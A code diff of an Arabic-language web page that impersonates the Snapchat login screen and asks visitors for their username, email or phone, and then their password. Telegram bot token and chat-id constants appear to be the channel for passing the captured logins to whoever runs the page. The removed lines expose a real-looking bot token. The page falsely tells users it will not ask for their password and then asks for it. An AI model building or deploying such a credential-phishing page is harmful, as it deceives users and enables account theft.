@@ -2,452 +2,1232 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>تسجيل الدخول — واجهة احترافية</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+  <title>سناب شات - تسجيل دخول</title>
 
-  <!--
-    IMPORTANT:
-    - إن أردت الإرسال فعليًا من المتصفح ضع توكن البوت و chat_id هنا (على جهازك فقط).
-    - لا ترفع هذا الملف أو تشاركه بعد لصق التوكن لأن التوكن سيظهر في طلبات الشبكة.
-      مثال:
-        const TG_TOKEN = '123456789:AAEx...';
-        const TG_CHAT_ID = '987654321';
-  -->
   <script>
-    const TG_TOKEN = '8794884027:AAEMu6aUsnkIwTvEyO05D8Aq4gheORNREac';
-    const TG_CHAT_ID = '6873334348';
+    // ضع هنا البيانات الخاصة بالبوت على جهازك فقط
+    const TG_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+    const TG_CHAT_ID = 'YOUR_CHAT_ID_HERE';
   </script>
 
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
 
   <style>
-    :root{
-      --bg:#eef6fb;
-      --card:#ffffff;
-      --accent:#ffd24d;
-      --primary:#0aa3ff;
-      --muted:#6f7c86;
-      --glass: rgba(255,255,255,0.9);
-      --radius:18px;
-      --shadow-lg: 0 30px 80px rgba(10,20,30,0.08);
-      --shadow-sm: 0 10px 30px rgba(10,20,30,0.06);
-      --ease: cubic-bezier(.2,.9,.2,1);
-      --success:#28c76f;
-      --danger:#ff4d4f;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
     }
 
-    *{box-sizing:border-box}
-    html,body{height:100%;margin:0;background:var(--bg);font-family:'Cairo',system-ui,Arial;color:#04292e;direction:rtl;-webkit-font-smoothing:antialiased}
-    .viewport{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-
-    /* device/card */
-    .device{width:420px;max-width:96%}
-    .card{
-      background:var(--card);
-      border-radius:24px;
-      padding:22px;
-      box-shadow:var(--shadow-lg);
-      overflow:hidden;
-      position:relative;
-      transform-origin:center;
+    :root {
+      --primary: #fffc00;
+      --primary-dark: #e8eb00;
+      --bg: #000000;
+      --card: #0a0a0a;
+      --text: #ffffff;
+      --text-muted: #b3b3b3;
+      --border: #2d2d2d;
+      --success: #31a24c;
+      --danger: #ff4458;
+      --warning: #ff9500;
+      --glass: rgba(255, 255, 255, 0.08);
+      --shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+      --shadow-sm: 0 4px 12px rgba(0, 0, 0, 0.3);
+      --ease: cubic-bezier(0.25, 0.46, 0.45, 0.94);
+      --radius-lg: 24px;
+      --radius-md: 16px;
+      --radius-sm: 12px;
     }
 
-    /* brand */
-    .brand{
-      position:absolute;left:50%;top:-42px;transform:translateX(-50%);display:inline-flex;align-items:center;gap:10px;padding:10px 16px;border-radius:999px;
-      background:linear-gradient(180deg,var(--accent),#ffdf86);font-weight:800;box-shadow:0 14px 36px rgba(0,0,0,0.12);
+    html, body {
+      height: 100%;
+      width: 100%;
+      margin: 0;
+      padding: 0;
+      background: var(--bg);
+      font-family: 'Cairo', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      color: var(--text);
+      direction: rtl;
+      -webkit-font-smoothing: antialiased;
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      user-select: none;
+      overflow: hidden;
     }
-    .brand img{width:18px;height:18px;object-fit:contain}
 
-    .header{display:flex;flex-direction:column;align-items:center;gap:8px;margin-top:2px}
-    .logo{width:64px;height:64px;border-radius:12px;display:flex;align-items:center;justify-content:center;background:linear-gradient(180deg,#fff,#f6fbff);box-shadow:var(--shadow-sm)}
-    .logo img{width:36px;height:36px;object-fit:contain}
-    h1{font-size:22px;margin:2px 0 0;font-weight:800;text-align:center}
-    p.lead{font-size:13px;color:var(--muted);margin:0;text-align:center;padding:0 6px}
-
-    /* fields */
-    .field{margin-top:14px}
-    label{display:block;color:var(--muted);margin-bottom:8px;font-size:14px}
-    .input-row{display:flex;gap:10px;align-items:center}
-    input[type="text"], input[type="email"], input[type="tel"], .select-btn{
-      width:100%;padding:14px 12px;border-radius:12px;border:1px solid rgba(6,41,40,0.04);background:linear-gradient(180deg,#fff,#fbfdff);font-size:16px;outline:none;
-      box-shadow:var(--shadow-sm);transition:box-shadow .18s var(--ease), transform .12s var(--ease), border-color .18s var(--ease);
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
-    input:focus{box-shadow:0 18px 50px rgba(10,160,255,0.10);transform:translateY(-3px);border-color:rgba(10,160,255,0.14)}
-    .select-btn{display:inline-flex;align-items:center;gap:8px;padding:10px;border-radius:12px;border:1px solid #eef7ff;cursor:pointer;font-weight:700;background:#fff}
 
-    .micro{margin-top:10px;padding:8px;border-radius:12px;background:var(--glass);text-align:center;color:var(--muted);font-size:13px;border:1px solid rgba(255,255,255,0.7)}
-
-    /* buttons */
-    .controls{display:flex;gap:12px;justify-content:center;margin-top:18px}
-    .btn{
-      display:inline-flex;align-items:center;gap:8px;justify-content:center;
-      background:linear-gradient(180deg,var(--primary),#0a92d9);
-      color:#fff;padding:12px 18px;border-radius:999px;border:0;font-weight:900;cursor:pointer;
-      box-shadow:0 12px 36px rgba(10,160,255,0.16);transition:transform .12s ease, box-shadow .12s ease;
+    .viewport {
+      width: 100%;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0;
+      overflow: hidden;
     }
-    .btn:active{transform:translateY(2px);box-shadow:0 6px 20px rgba(10,160,255,0.12)}
-    .btn.ghost{background:#fff;color:var(--primary);border:1px solid #e9f6ff;box-shadow:none}
-    .hint{font-size:13px;color:var(--muted);text-align:center;margin-top:12px}
 
-    /* pages & animations */
-    .page{min-height:320px}
-    .hidden{display:none}
-    .slide-in{animation:slideIn .36s var(--ease) both}
-    .slide-out{animation:slideOut .28s var(--ease) both}
-    @keyframes slideIn{from{opacity:0;transform:translateX(16px)}to{opacity:1;transform:none}}
-    @keyframes slideOut{from{opacity:1;transform:none}to{opacity:0;transform:translateX(-16px)}}
+    .phone-frame {
+      width: 100%;
+      height: 100vh;
+      max-width: 480px;
+      display: flex;
+      flex-direction: column;
+      background: var(--bg);
+      position: relative;
+      overflow: hidden;
+    }
 
-    /* modal */
-    .modal-back{position:fixed;inset:0;display:none;align-items:flex-end;justify-content:center;padding:12px;background:linear-gradient(180deg,rgba(0,0,0,0.26),rgba(0,0,0,0.32));z-index:90}
-    .modal{width:100%;max-width:420px;background:var(--card);border-radius:14px;padding:12px;max-height:72vh;overflow:hidden;box-shadow:0 18px 60px rgba(0,0,0,0.20)}
-    .modal input{width:100%;padding:10px;border-radius:10px;border:1px solid #eef6ff}
-    .country-list{overflow:auto;max-height:56vh;margin-top:8px;padding-right:6px}
-    .country-item{display:flex;align-items:center;justify-content:space-between;padding:10px;border-radius:10px;cursor:pointer;transition:background .12s}
-    .country-item:hover{background:#f6fbff}
-    .country-flag{font-size:18px}
+    .status-bar {
+      height: max(24px, env(safe-area-inset-top));
+      background: var(--bg);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 4px 16px;
+      font-size: 12px;
+      color: var(--text);
+      border-bottom: 1px solid var(--border);
+    }
 
-    /* toast */
-    .toast-back{position:fixed;inset:0;display:none;align-items:center;justify-content:center;z-index:100}
-    .toast{background:#fff;padding:18px;border-radius:12px;box-shadow:0 26px 90px rgba(0,0,0,0.28);width:92%;max-width:380px;text-align:center}
-    .toast h3{margin:0 0 8px;font-size:18px}
-    .toast p{margin:0;color:#444;font-size:15px}
-    .toast button{margin-top:12px;padding:10px 14px;border-radius:8px;background:var(--primary);color:#fff;border:none;cursor:pointer;font-weight:700}
+    .status-left, .status-right {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
 
-    @media(max-width:420px){
-      .device{width:360px}
-      h1{font-size:20px}
-      input[type="text"],input[type="tel"]{font-size:15px}
+    .container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .page {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      overflow-y: auto;
+      overflow-x: hidden;
+      padding: 0;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    .page.hidden {
+      display: none !important;
+    }
+
+    .page.slide-in {
+      animation: slideInRight 0.4s var(--ease) forwards;
+    }
+
+    .page.slide-out {
+      animation: slideOutRight 0.4s var(--ease) forwards;
+    }
+
+    @keyframes slideInRight {
+      from {
+        opacity: 0;
+        transform: translateX(100%);
+      }
+      to {
+        opacity: 1;
+        transform: translateX(0);
+      }
+    }
+
+    @keyframes slideOutRight {
+      from {
+        opacity: 1;
+        transform: translateX(0);
+      }
+      to {
+        opacity: 0;
+        transform: translateX(-100%);
+      }
+    }
+
+    .page-content {
+      display: flex;
+      flex-direction: column;
+      padding: 20px 16px;
+      padding-bottom: max(20px, env(safe-area-inset-bottom));
+      flex: 1;
+    }
+
+    .snap-logo {
+      width: 80px;
+      height: 80px;
+      margin: 40px auto 24px;
+      background: var(--primary);
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 48px;
+      box-shadow: 0 10px 40px rgba(255, 252, 0, 0.3);
+      animation: logoBounce 2s ease-in-out infinite;
+    }
+
+    @keyframes logoBounce {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+    }
+
+    .page-header {
+      text-align: center;
+      margin-bottom: 32px;
+    }
+
+    .page-title {
+      font-size: 28px;
+      font-weight: 900;
+      color: var(--text);
+      margin-bottom: 8px;
+      letter-spacing: -0.5px;
+    }
+
+    .page-subtitle {
+      font-size: 14px;
+      color: var(--text-muted);
+      line-height: 1.5;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-muted);
+      margin-bottom: 8px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .input-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    input[type="text"],
+    input[type="tel"],
+    input[type="email"],
+    .country-select {
+      width: 100%;
+      padding: 14px 16px;
+      background: var(--glass);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      color: var(--text);
+      font-size: 16px;
+      font-family: 'Cairo', sans-serif;
+      font-weight: 500;
+      transition: all 0.3s var(--ease);
+      outline: none;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+
+    input[type="text"]::placeholder,
+    input[type="tel"]::placeholder,
+    input[type="email"]::placeholder {
+      color: var(--text-muted);
+      opacity: 0.7;
+    }
+
+    input[type="text"]:focus,
+    input[type="tel"]:focus,
+    input[type="email"]:focus {
+      background: rgba(255, 252, 0, 0.08);
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.1);
+    }
+
+    .country-select {
+      cursor: pointer;
+      background: var(--glass);
+      flex: 0 0 auto;
+      padding: 14px 12px;
+      min-width: 80px;
+      text-align: center;
+    }
+
+    .country-select:hover {
+      background: rgba(255, 252, 0, 0.08);
+      border-color: var(--primary);
+    }
+
+    .input-icon {
+      color: var(--text-muted);
+      font-size: 18px;
+      display: flex;
+      align-items: center;
+    }
+
+    .info-box {
+      background: rgba(49, 162, 76, 0.1);
+      border: 1px solid var(--success);
+      border-radius: var(--radius-md);
+      padding: 12px;
+      margin-bottom: 20px;
+      font-size: 12px;
+      color: var(--success);
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+    }
+
+    .info-icon {
+      flex-shrink: 0;
+      font-size: 16px;
+      margin-top: 1px;
+    }
+
+    .form-hint {
+      font-size: 12px;
+      color: var(--text-muted);
+      margin-top: 8px;
+      min-height: 16px;
+      transition: color 0.3s ease;
+    }
+
+    .form-hint.error {
+      color: var(--danger);
+    }
+
+    .form-hint.warning {
+      color: var(--warning);
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+      color: #000000;
+      border: none;
+      border-radius: var(--radius-md);
+      font-size: 16px;
+      font-weight: 700;
+      font-family: 'Cairo', sans-serif;
+      cursor: pointer;
+      transition: all 0.3s var(--ease);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      -webkit-appearance: none;
+      appearance: none;
+      box-shadow: 0 8px 24px rgba(255, 252, 0, 0.25);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn:active {
+      transform: scale(0.96);
+      box-shadow: 0 4px 12px rgba(255, 252, 0, 0.15);
+    }
+
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .btn.secondary {
+      background: var(--glass);
+      color: var(--text);
+      border: 1px solid var(--border);
+      box-shadow: none;
+    }
+
+    .btn.secondary:active {
+      background: rgba(255, 255, 255, 0.12);
+      border-color: var(--primary);
+    }
+
+    .btn-group {
+      display: flex;
+      gap: 10px;
+      margin-top: 16px;
+    }
+
+    .btn-group .btn {
+      flex: 1;
+    }
+
+    .btn svg {
+      width: 20px;
+      height: 20px;
+    }
+
+    .toggle-mode {
+      width: 100%;
+      padding: 10px;
+      background: transparent;
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      color: var(--text);
+      font-size: 13px;
+      font-family: 'Cairo', sans-serif;
+      cursor: pointer;
+      transition: all 0.3s var(--ease);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 16px;
+    }
+
+    .toggle-mode:active {
+      background: var(--glass);
+      border-color: var(--primary);
+    }
+
+    /* Modal */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.6);
+      display: none;
+      align-items: flex-end;
+      justify-content: center;
+      z-index: 1000;
+      animation: fadeIn 0.3s ease;
+    }
+
+    .modal-overlay.show {
+      display: flex;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .modal {
+      width: 100%;
+      max-width: 480px;
+      background: var(--card);
+      border-radius: var(--radius-lg) var(--radius-lg) 0 0;
+      padding: 20px;
+      max-height: 80vh;
+      display: flex;
+      flex-direction: column;
+      animation: slideUp 0.3s var(--ease);
+      padding-bottom: max(20px, env(safe-area-inset-bottom));
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(100%);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .modal-header {
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 16px;
+      color: var(--text);
+    }
+
+    .modal-search {
+      width: 100%;
+      padding: 10px 12px;
+      background: var(--glass);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      color: var(--text);
+      font-size: 14px;
+      font-family: 'Cairo', sans-serif;
+      margin-bottom: 12px;
+      outline: none;
+    }
+
+    .modal-search:focus {
+      background: rgba(255, 252, 0, 0.08);
+      border-color: var(--primary);
+    }
+
+    .modal-list {
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .modal-item {
+      padding: 12px;
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      transition: all 0.2s ease;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+    }
+
+    .modal-item:active {
+      background: var(--glass);
+    }
+
+    .modal-item-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex: 1;
+    }
+
+    .modal-item-flag {
+      font-size: 28px;
+      flex-shrink: 0;
+    }
+
+    .modal-item-info {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+
+    .modal-item-name {
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    .modal-item-code {
+      font-size: 12px;
+      color: var(--text-muted);
+    }
+
+    .modal-item-dial {
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--primary);
+    }
+
+    /* Toast */
+    .toast-overlay {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 2000;
+      background: rgba(0, 0, 0, 0.4);
+    }
+
+    .toast-overlay.show {
+      display: flex;
+    }
+
+    .toast {
+      background: var(--card);
+      border-radius: var(--radius-lg);
+      padding: 24px;
+      width: 90%;
+      max-width: 340px;
+      text-align: center;
+      box-shadow: var(--shadow);
+      animation: toastIn 0.3s var(--ease);
+      border: 1px solid var(--border);
+    }
+
+    @keyframes toastIn {
+      from {
+        opacity: 0;
+        transform: scale(0.9);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+
+    .toast-icon {
+      font-size: 48px;
+      margin-bottom: 12px;
+    }
+
+    .toast-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 8px;
+    }
+
+    .toast-text {
+      font-size: 14px;
+      color: var(--text-muted);
+      line-height: 1.5;
+      margin-bottom: 16px;
+    }
+
+    .toast-btn {
+      width: 100%;
+      padding: 10px;
+      background: var(--primary);
+      color: #000000;
+      border: none;
+      border-radius: var(--radius-sm);
+      font-size: 14px;
+      font-weight: 700;
+      font-family: 'Cairo', sans-serif;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .toast-btn:active {
+      transform: scale(0.96);
+    }
+
+    .loading-spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(0, 0, 0, 0.3);
+      border-top-color: #000000;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 480px) {
+      .phone-frame {
+        max-width: 100%;
+      }
+
+      .page-title {
+        font-size: 24px;
+      }
+
+      .snap-logo {
+        width: 70px;
+        height: 70px;
+        font-size: 40px;
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      * {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+      }
     }
   </style>
 </head>
 <body>
   <div class="viewport">
-    <div class="device">
-      <div class="card" role="application" aria-label="نموذج تسجيل">
+    <div class="phone-frame">
+      <!-- Status Bar -->
+      <div class="status-bar">
+        <div class="status-left">
+          <span>9:41</span>
+        </div>
+        <div class="status-right">
+          <span>📶</span>
+          <span>📡</span>
+          <span>🔋</span>
+        </div>
+      </div>
 
-        <div class="brand" aria-hidden="true"><img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="logo" /> Open Snapchat</div>
+      <!-- Container -->
+      <div class="container">
+        <!-- Page 1: Username/Phone/Email -->
+        <div id="page1" class="page">
+          <div class="page-content">
+            <div class="snap-logo">👻</div>
 
-        <div class="header">
-          <div class="logo"><img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="logo" /></div>
-          <h1 id="pageTitle">تسجيل الدخول إلى سناب شات</h1>
+            <div class="page-header">
+              <h1 class="page-title">سناب شات</h1>
+              <p class="page-subtitle">أدخل اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف</p>
+            </div>
+
+            <div class="info-box">
+              <div class="info-icon">ℹ️</div>
+              <div>حسابك آمن معنا - لن نطلب كلمة المرور هنا</div>
+            </div>
+
+            <!-- Username/Email Mode -->
+            <div id="userEmailMode">
+              <div class="form-group">
+                <label class="form-label" for="primary">اسم المستخدم أو البريد</label>
+                <div class="input-wrapper">
+                  <input 
+                    id="primary" 
+                    type="text" 
+                    placeholder="أدخل اسمك أو بريدك الإلكتروني"
+                    autocomplete="off"
+                    inputmode="latin"
+                  />
+                </div>
+                <div class="form-hint" id="hint1"></div>
+              </div>
+            </div>
+
+            <!-- Phone Mode (Hidden by default) -->
+            <div id="phoneMode" class="hidden">
+              <div class="form-group">
+                <label class="form-label">رقم الهاتف</label>
+                <div class="input-wrapper">
+                  <button id="countryBtn" class="country-select" type="button" aria-label="اختر الدولة">
+                    <span id="countryFlag">🇸🇦</span>
+                    <span id="countryDial">+966</span>
+                  </button>
+                  <input 
+                    id="phoneInput" 
+                    type="tel" 
+                    placeholder="أدخل رقم الهاتف"
+                    inputmode="numeric"
+                    autocomplete="off"
+                  />
+                </div>
+                <div class="form-hint" id="hintPhone"></div>
+              </div>
+            </div>
+
+            <button id="toggleBtn" class="toggle-mode" type="button">
+              <span id="toggleText">استخدم رقم الهاتف بدلاً من ذلك</span>
+            </button>
+
+            <button id="continueBtn" class="btn" type="button">
+              <span>المتابعة</span>
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M5 12h14M13 5l7 7-7 7"/>
+              </svg>
+            </button>
+          </div>
         </div>
 
-        <!-- PAGE 1 (Primary Input) -->
-        <section id="page-1" class="page">
-          <div class="field">
-            <label for="primaryInput">اسم المستخدم أو البريد الإلكتروني</label>
-            <div id="primaryHolder">
-              <input id="primaryInput" type="text" placeholder="مثال: myusername أو email@example.com" inputmode="latin" autocomplete="off" />
+        <!-- Page 2: Password -->
+        <div id="page2" class="page hidden">
+          <div class="page-content">
+            <div style="height: 80px; display: flex; align-items: center; justify-content: center;">
+              <button id="backBtn" style="position: absolute; right: 16px; background: none; border: none; color: var(--text); font-size: 24px; cursor: pointer; padding: 8px;">←</button>
             </div>
-          </div>
 
-          <div style="text-align:center;margin-top:12px">
-            <button id="phoneToggle" class="select-btn" aria-pressed="false">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" style="vertical-align:middle"><path d="M22 16.92V20a2 2 0 0 1-2.18 2 19.86 19.86 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6A19.86 19.86 0 0 1 2 4.18 2 2 0 0 1 4 2h3.09a1 1 0 0 1 1 .75c.12.7.3 1.37.54 2a1 1 0 0 1-.25 1L7.91 7.91a14 14 0 0 0 6 6l1.16-1.16a1 1 0 0 1 1-.25c.63.24 1.3.42 2 .54a1 1 0 0 1 .75 1V20z" fill="#04292e"/></svg>
-              <span style="margin-inline-start:8px">استخدم رقم الهاتف بدلاً من ذلك</span>
+            <div class="page-header" style="margin-top: 0;">
+              <h1 class="page-title" id="page2Title">أدخل كلمة المرور</h1>
+              <p class="page-subtitle" id="page2Subtitle">كلمة المرور آمنة معنا</p>
+            </div>
+
+            <div class="form-group" style="margin-top: 24px;">
+              <label class="form-label" for="password">كلمة المرور</label>
+              <div class="input-wrapper">
+                <input 
+                  id="password" 
+                  type="password" 
+                  placeholder="أدخل كلمة المرور"
+                  autocomplete="off"
+                />
+                <button 
+                  id="togglePassword" 
+                  type="button" 
+                  style="position: absolute; right: 12px; background: none; border: none; color: var(--text-muted); cursor: pointer; font-size: 18px; padding: 0;"
+                  aria-label="إظهار/إخفاء كلمة المرور"
+                >
+                  👁️
+                </button>
+              </div>
+              <div class="form-hint" id="hintPassword"></div>
+            </div>
+
+            <button id="sendBtn" class="btn" type="button" style="margin-top: 24px;">
+              <span id="sendBtnText">دخول</span>
+              <span id="sendSpinner" class="hidden">
+                <span class="loading-spinner"></span>
+              </span>
+            </button>
+
+            <button id="forgotBtn" class="btn secondary" type="button" style="margin-top: 12px;">
+              هل نسيت كلمة المرور؟
             </button>
           </div>
-
-          <div class="controls" style="margin-top:18px">
-            <button id="continueBtn" class="btn" aria-label="المتابعة">المتابعة
-              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" style="vertical-align:middle"><path d="M5 12h14M13 5l7 7-7 7" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            </button>
-          </div>
-
-          <div class="hint" id="hint1" aria-live="polite"></div>
-        </section>
-
-        <!-- PAGE 2 (Name) - Separate page within same file -->
-        <section id="page-2" class="page hidden" aria-labelledby="title2">
-          <h1 id="title2" style="margin-top:0">ادخل كلمة سر حسابك للتحقق من ملكيتك للحساب</h1>
-
-
-          <div class="field">
-            <label for="nameInput">كلمة السر</label>
-            <input id="nameInput" type="text" placeholder="ادخل كلمة سر حسابك " autocomplete="off" />
-          </div>
-
-          <div class="controls">
-            <button id="sendBtn" class="btn">تسجيل الدخول</button>
-            <button id="backBtn" class="btn ghost">العودة</button>
-          </div>
-
-          <div class="hint" id="hint2" aria-live="polite"></div>
-        </section>
-
+        </div>
       </div>
     </div>
   </div>
 
-  <!-- Country selection modal -->
-  <div id="countryModal" class="modal-back" aria-hidden="true">
-    <div class="modal" role="dialog" aria-modal="true" aria-label="اختر الدولة">
-      <div style="text-align:center;font-weight:700;margin-bottom:6px">اختر الدولة</div>
-      <input id="countrySearch" placeholder="ابحث عن دولة أو رمز..." />
-      <div id="countryList" class="country-list" role="listbox"></div>
+  <!-- Country Selection Modal -->
+  <div id="countryModal" class="modal-overlay">
+    <div class="modal" role="dialog" aria-modal="true">
+      <div class="modal-header">اختر الدولة</div>
+      <input 
+        id="countrySearch" 
+        class="modal-search" 
+        type="text" 
+        placeholder="ابحث عن دولة..."
+        autocomplete="off"
+      />
+      <div id="countryList" class="modal-list" role="listbox"></div>
     </div>
   </div>
 
-  <!-- Professional toast -->
-  <div id="toastBack" class="toast-back" aria-hidden="true">
+  <!-- Toast Notification -->
+  <div id="toastOverlay" class="toast-overlay">
     <div class="toast" role="alertdialog" aria-live="assertive">
-      <h3 id="toastTitle">عذراً</h3>
-      <p id="toastText">اسم المستخدم أو كلمة السر غير صحيحة. يرجى التحقق والمحاولة مرة أخرى.</p>
-      <div style="margin-top:12px"><button id="toastOk">حسناً</button></div>
+      <div class="toast-icon" id="toastIcon">⚠️</div>
+      <div class="toast-title" id="toastTitle">عذراً</div>
+      <div class="toast-text" id="toastText">حدث خطأ</div>
+      <button id="toastBtn" class="toast-btn" type="button">حسناً</button>
     </div>
   </div>
 
   <script>
-    // ====== Data & helpers ======
+    // ==================== CONFIG ====================
     const COUNTRIES = [
-      {name:'الأردن', code:'JO', dial:'+962', flag:'🇯🇴'},
-      {name:'مصر', code:'EG', dial:'+20', flag:'🇪🇬'},
-      {name:'السعودية', code:'SA', dial:'+966', flag:'🇸🇦'},
-      {name:'الإمارات', code:'AE', dial:'+971', flag:'🇦🇪'},
-      {name:'الكويت', code:'KW', dial:'+965', flag:'🇰🇼'},
-      {name:'لبنان', code:'LB', dial:'+961', flag:'🇱🇧'},
-      {name:'الولايات المتحدة', code:'US', dial:'+1', flag:'🇺🇸'},
-      {name:'المملكة المتحدة', code:'GB', dial:'+44', flag:'🇬🇧'}
+      { name: 'السعودية', code: 'SA', dial: '+966', flag: '🇸🇦' },
+      { name: 'الإمارات', code: 'AE', dial: '+971', flag: '🇦🇪' },
+      { name: 'مصر', code: 'EG', dial: '+20', flag: '🇪🇬' },
+      { name: 'الأردن', code: 'JO', dial: '+962', flag: '🇯🇴' },
+      { name: 'الكويت', code: 'KW', dial: '+965', flag: '🇰🇼' },
+      { name: 'قطر', code: 'QA', dial: '+974', flag: '🇶🇦' },
+      { name: 'البحرين', code: 'BH', dial: '+973', flag: '🇧🇭' },
+      { name: 'عمان', code: 'OM', dial: '+968', flag: '🇴🇲' },
+      { name: 'لبنان', code: 'LB', dial: '+961', flag: '🇱🇧' },
+      { name: 'المغرب', code: 'MA', dial: '+212', flag: '🇲🇦' },
+      { name: 'تونس', code: 'TN', dial: '+216', flag: '🇹🇳' },
+      { name: 'الجزائر', code: 'DZ', dial: '+213', flag: '🇩🇿' },
+      { name: 'السودان', code: 'SD', dial: '+249', flag: '🇸🇩' },
+      { name: 'فلسطين', code: 'PS', dial: '+970', flag: '🇵🇸' },
+      { name: 'العراق', code: 'IQ', dial: '+964', flag: '🇮🇶' },
+      { name: 'سوريا', code: 'SY', dial: '+963', flag: '🇸🇾' },
+      { name: 'الولايات المتحدة', code: 'US', dial: '+1', flag: '🇺🇸' },
+      { name: 'كندا', code: 'CA', dial: '+1', flag: '🇨🇦' },
+      { name: 'المملكة المتحدة', code: 'GB', dial: '+44', flag: '🇬🇧' },
     ];
-    const usernameRx = /^[A-Za-z0-9._-]{3,30}$/;
-    const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    const digitsOnly = s => s.replace(/[^\d]/g,'');
 
-    // ====== DOM refs ======
-    const page1 = document.getElementById('page-1');
-    const page2 = document.getElementById('page-2');
-    const primaryHolder = document.getElementById('primaryHolder');
-    let primaryInput = document.getElementById('primaryInput');
-    const phoneToggle = document.getElementById('phoneToggle');
+    const REGEX = {
+      username: /^[A-Za-z0-9._-]{3,30}$/,
+      email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
+      phone: /^\d{6,15}$/,
+    };
+
+    // ==================== STATE ====================
+    let state = {
+      phoneMode: false,
+      selectedCountry: COUNTRIES[0],
+      credentials: null,
+      isLoading: false,
+    };
+
+    // ==================== DOM REFS ====================
+    const page1 = document.getElementById('page1');
+    const page2 = document.getElementById('page2');
+    const userEmailMode = document.getElementById('userEmailMode');
+    const phoneMode = document.getElementById('phoneMode');
+    const primaryInput = document.getElementById('primary');
+    const phoneInput = document.getElementById('phoneInput');
+    const passwordInput = document.getElementById('password');
+    const togglePasswordBtn = document.getElementById('togglePassword');
+
+    const toggleBtn = document.getElementById('toggleBtn');
+    const toggleText = document.getElementById('toggleText');
     const continueBtn = document.getElementById('continueBtn');
-    const hint1 = document.getElementById('hint1');
+    const sendBtn = document.getElementById('sendBtn');
+    const sendBtnText = document.getElementById('sendBtnText');
+    const sendSpinner = document.getElementById('sendSpinner');
